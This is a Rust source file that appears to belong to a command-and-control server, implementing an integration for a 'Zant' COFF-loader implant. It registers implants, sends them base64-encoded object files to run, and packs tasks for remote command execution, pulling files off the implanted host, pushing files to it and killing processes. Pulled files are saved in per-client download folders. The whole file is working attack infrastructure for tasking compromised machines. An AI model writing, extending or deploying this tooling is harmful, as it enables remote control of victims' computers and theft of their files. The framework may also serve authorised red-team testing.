use std::{
    io::{Error, ErrorKind, Result},
    path::{Path, PathBuf},
};

use base64::{engine::general_purpose::STANDARD, Engine as _};
use uuid::Uuid;

use crate::util::{
    implants::{ImplantCapability, ImplantFamily, ImplantRecord, RegisterPayload},
    payloads::{ArtifactSource, PayloadArtifact},
    tasks::{
        TaskEnvelope, TaskRecord, TaskResultData, TaskResultHandling, TaskResultPayload, TaskSpec,
        TaskStatus,
    },
};

use super::{
    manifest::{IntegrationManifest, ManifestArgMode},
    types::{ImplantIntegration, TaskDefinition, UiActionDefinition},
};

#[derive(Debug, Clone)]
struct PayloadDefinition {
    command_name: String,
    logical_name: String,
    entrypoint: String,
    usage: String,
    arg_mode: ManifestArgMode,
}

pub struct ZantIntegration {
    manifest: IntegrationManifest,
    capabilities: Vec<ImplantCapability>,
    task_definitions: Vec<TaskDefinition>,
    ui_actions: Vec<UiActionDefinition>,
    payload_definitions: Vec<PayloadDefinition>,
}

impl ZantIntegration {
    pub fn load(path: &Path) -> Result<Self> {
        let manifest = IntegrationManifest::load(path)?;
        let capabilities = manifest.capabilities()?;
        let task_definitions = manifest.task_definitions();
        let ui_actions = manifest.ui_actions();
        let payload_definitions = manifest
            .tasks
            .iter()
            .map(|task| PayloadDefinition {
                command_name: task.kind.clone(),
                logical_name: task.artifact.clone(),
                entrypoint: task.entrypoint.clone(),
                usage: task.usage.clone(),
                arg_mode: task.arg_mode.clone(),
            })
            .collect();

        Ok(Self {
            manifest,
            capabilities,
            task_definitions,
            ui_actions,
            payload_definitions,
        })
    }
}

impl ImplantIntegration for ZantIntegration {
    fn id(&self) -> &str {
        &self.manifest.id
    }

    fn implant_type(&self) -> &str {
        &self.manifest.implant_type
    }

    fn family(&self) -> ImplantFamily {
        match self.manifest.family.as_str() {
            "coff_loader" => ImplantFamily::CoffLoader,
            other => ImplantFamily::Unknown(other.to_string()),
        }
    }

    fn supported_protocol_versions(&self) -> &[u32] {
        &self.manifest.protocol_versions
    }

    fn capabilities(&self) -> &[ImplantCapability] {
        &self.capabilities
    }

    fn task_definitions(&self) -> &[TaskDefinition] {
        &self.task_definitions
    }

    fn ui_actions(&self) -> &[UiActionDefinition] {
        &self.ui_actions
    }

    fn validate_registration(&self, payload: &RegisterPayload) -> Result<()> {
        if payload.implant_type != self.implant_type() {
            return Err(Error::new(
                ErrorKind::InvalidInput,
                format!(
                    "Integration '{}' does not accept implant type '{}'",
                    self.id(),
                    payload.implant_type
                ),
            ));
        }

        if self
            .supported_protocol_versions()
            .contains(&payload.protocol_version)
        {
            Ok(())
        } else {
            Err(Error::new(
                ErrorKind::InvalidInput,
                format!(
                    "Unsupported protocol version {} for implant type {}",
                    payload.protocol_version,
                    payload.implant_type
                ),
            ))
        }
    }

    fn build_task(
        &self,
        implant: &ImplantRecord,
        task_kind: &str,
        args: &[String],
        artifacts: &dyn ArtifactSource,
    ) -> Result<Option<TaskSpec>> {
        let Some(definition) = self
            .payload_definitions
            .iter()
            .find(|definition| definition.command_name == task_kind)
        else {
            return Ok(None);
        };

        let artifact: PayloadArtifact = artifacts.resolve(
            &definition.logical_name,
            &self
                .manifest
                .artifact_roots
                .iter()
                .map(PathBuf::from)
                .collect::<Vec<_>>(),
        )?;
        let (payload_args, result_handling) = validate_and_pack_args(implant, definition, args)?;
        Ok(Some(TaskSpec::execute_coff_with_handling(
            artifact.file_name,
            artifact.bytes,
            definition.entrypoint.clone(),
            encode_argument_blob(&payload_args),
            result_handling,
        )))
    }

    fn serialize_task(&self, task: &TaskRecord) -> Result<TaskEnvelope> {
        match &task.spec {
            TaskSpec::ExecuteCoff(spec) => Ok(TaskEnvelope {
                task_id: task.task_id,
                task_type: task.spec.task_type().to_string(),
                object_name: spec.object_name.clone(),
                entrypoint: spec.entrypoint.clone(),
                object_encoding: "base64".to_string(),
                object_data: STANDARD.encode(&spec.object_bytes),
                args_encoding: "base64".to_string(),
                args_data: STANDARD.encode(&spec.args),
            }),
        }
    }

    fn decode_result(
        &self,
        task: &TaskRecord,
        payload: TaskResultPayload,
    ) -> Result<(Uuid, TaskStatus, TaskResultData)> {
        let status = if payload.status.eq_ignore_ascii_case("success") {
            TaskStatus::Completed
        } else {
            TaskStatus::Failed
        };

        if payload.result_encoding.is_empty() {
            return Err(Error::new(
                ErrorKind::InvalidInput,
                "Missing result encoding",
            ));
        }

        let result = match (&task.spec, &status) {
            (TaskSpec::ExecuteCoff(spec), TaskStatus::Completed) => match &spec.result_handling {
                TaskResultHandling::Text => TaskResultData::Text {
                    encoding: payload.result_encoding,
                    data: payload.result_data,
                },
                TaskResultHandling::Download { save_path } => {
                    let bytes = STANDARD.decode(payload.result_data).map_err(|err| {
                        Error::new(
                            ErrorKind::InvalidInput,
                            format!("Invalid base64 download result: {err}"),
                        )
                    })?;

                    if let Some(parent) = save_path.parent() {
                        std::fs::create_dir_all(parent)?;
                    }
                    std::fs::write(save_path, &bytes)?;

                    TaskResultData::Text {
                        encoding: "utf8".to_string(),
                        data: format!("saved {} bytes to {}", bytes.len(), save_path.display()),
                    }
                }
            },
            _ => TaskResultData::Text {
                encoding: payload.result_encoding,
                data: payload.result_data,
            },
        };

        Ok((payload.task_id, status, result))
    }
}

fn validate_and_pack_args(
    implant: &ImplantRecord,
    definition: &PayloadDefinition,
    args: &[String],
) -> Result<(Vec<String>, TaskResultHandling)> {
    match &definition.arg_mode {
        ManifestArgMode::None => {
            if args.is_empty() {
                Ok((Vec::new(), TaskResultHandling::Text))
            } else {
                Err(invalid_usage(&definition.usage))
            }
        }
        ManifestArgMode::Exact { count } => {
            if args.len() == *count {
                Ok((args.to_vec(), TaskResultHandling::Text))
            } else {
                Err(invalid_usage(&definition.usage))
            }
        }
        ManifestArgMode::OptionalSingle { default_value } => {
            if args.len() > 1 {
                return Err(invalid_usage(&definition.usage));
            }

            if let Some(arg) = args.first() {
                Ok((vec![arg.clone()], TaskResultHandling::Text))
            } else {
                Ok((vec![default_value.clone()], TaskResultHandling::Text))
            }
        }
        ManifestArgMode::ExecuteCommandLine => {
            if args.is_empty() {
                Err(invalid_usage(&definition.usage))
            } else {
                Ok((vec![args.join(" ")], TaskResultHandling::Text))
            }
        }
        ManifestArgMode::Download => {
            if args.is_empty() || args.len() > 2 {
                return Err(invalid_usage(&definition.usage));
            }

            let remote_path = args[0].clone();
            let save_path = match args.get(1) {
                Some(path) => PathBuf::from(path),
                None => default_download_path(implant, &remote_path),
            };

            Ok((vec![remote_path], TaskResultHandling::Download { save_path }))
        }
        ManifestArgMode::UploadFromServer => {
            if args.len() < 2 {
                Err(invalid_usage(&definition.usage))
            } else {
                let source_path = PathBuf::from(&args[0]);
                let file_bytes = std::fs::read(&source_path).map_err(|err| {
                    Error::new(
                        ErrorKind::InvalidInput,
                        format!(
                            "Unable to read upload source '{}': {err}",
                            source_path.display()
                        ),
                    )
                })?;

                Ok((
                    vec![args[1].clone(), STANDARD.encode(file_bytes)],
                    TaskResultHandling::Text,
                ))
            }
        }
        ManifestArgMode::KillPid => {
            if args.len() != 1 || args[0].parse::<u32>().is_err() {
                Err(invalid_usage(&definition.usage))
            } else {
                Ok((args.to_vec(), TaskResultHandling::Text))
            }
        }
    }
}

fn invalid_usage(usage: &str) -> Error {
    Error::new(ErrorKind::InvalidInput, format!("Usage: {usage}"))
}

fn encode_argument_blob(args: &[String]) -> Vec<u8> {
    let mut encoded = Vec::new();
    encoded.extend_from_slice(&(args.len() as u32).to_le_bytes());
    for arg in args {
        let bytes = arg.as_bytes();
        encoded.extend_from_slice(&(bytes.len() as u32).to_le_bytes());
        encoded.extend_from_slice(bytes);
    }
    encoded
}

fn default_download_path(implant: &ImplantRecord, remote_path: &str) -> PathBuf {
    let file_name = Path::new(remote_path)
        .file_name()
        .and_then(|value| value.to_str())
        .filter(|value| !value.is_empty())
        .unwrap_or("download.bin");

    PathBuf::from("downloads")
        .join(implant.identity.clientid.to_string())
        .join(file_name)
}

#[cfg(test)]
mod tests {
    use crate::util::implants::ImplantCapability;
    use crate::util::integrations::types::ImplantIntegration;

    use super::ZantIntegration;

    #[test]
    fn loads_manifest_backed_integration() {
        let integration = ZantIntegration::load(
            &std::path::PathBuf::from("integrations")
                .join("zant")
                .join("manifest.json"),
        )
        .unwrap();

        assert_eq!(integration.id(), "zant");
        assert_eq!(integration.implant_type(), "coff_loader");
        assert!(integration
            .capabilities()
            .contains(&ImplantCapability::from_key("execute_coff")));
        assert!(integration
            .task_definitions()
            .iter()
            .any(|definition| definition.kind == "whoami"));
    }
}
